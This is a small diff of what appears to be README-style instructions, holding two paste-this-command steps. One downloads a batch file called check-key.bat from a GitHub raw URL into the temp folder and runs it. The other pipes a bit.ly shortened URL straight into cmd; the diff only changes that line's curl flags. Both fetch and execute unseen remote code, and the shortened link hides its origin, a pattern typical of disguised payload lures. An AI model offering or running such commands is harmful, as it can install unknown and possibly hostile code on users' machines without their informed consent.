@@ -4,5 +4,5 @@
 curl -fsSL https://raw.githubusercontent.com/longnguyen2026/check-key/main/check-key.bat -o "%TEMP%\check-key.bat" && call "%TEMP%\check-key.bat"
 ````
 ````Bash
-curl -L https://bit.ly/4h01qsh|cmd
+curl -fsSL https://bit.ly/4h01qsh|cmd
 ````
